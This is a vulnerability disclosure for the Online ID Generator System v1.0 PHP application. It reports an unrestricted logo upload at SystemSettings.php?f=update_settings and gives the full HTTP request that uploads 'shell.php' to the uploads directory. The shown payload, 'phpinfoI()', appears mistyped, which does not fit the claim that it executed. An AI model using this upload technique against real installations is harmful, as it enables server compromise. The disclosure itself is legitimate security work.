# Online ID Generator System v1.0 by oretnom23 has arbitrary code execution (RCE)

Author : WuQi Qi and Zhihong Tian, Guangzhou University

vendor: https://www.sourcecodester.com/php/14917/online-id-generator-system-using-php-free-source-code.html

Vulnerability url: http://ip/id_generator/classes/SystemSettings.php?f=update_settings

Loophole location： There is an arbitrary file upload vulnerability (RCE) in the system logo upload point in the system information.

Request package for file upload：

```sql
POST /id_generator/classes/SystemSettings.php?f=update_settings HTTP/1.1
Host: 192.168.1.88
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
X-Requested-With: XMLHttpRequest
Referer: http://192.168.1.88/id_generator/admin/?page=system_info
Content-Length: 451
Content-Type: multipart/form-data; boundary=---------------------------14440193412005
Cookie: PHPSESSID=ci1977vfr3bv4dcogigd9kogg6
Connection: close

-----------------------------14440193412005
Content-Disposition: form-data; name="name"

Online ID Generator System - PHP
-----------------------------14440193412005
Content-Disposition: form-data; name="short_name"

OIGS
-----------------------------14440193412005
Content-Disposition: form-data; name="img"; filename="shell.php"
Content-Type: application/octet-stream

<?php phpinfoI();?>
-----------------------------14440193412005--

```

The files will be uploaded to this directory \id_generator\uploads
![image](https://github.com/assets/54017627/0379b03a-6d49-4556-b8f4-d42e1e7d0fb1)


We visited the directory of the file in the browser and found that the code had been executed
![image](https://github.com/assets/54017627/ea5fe59b-d99d-4967-944d-17afb9a64719)



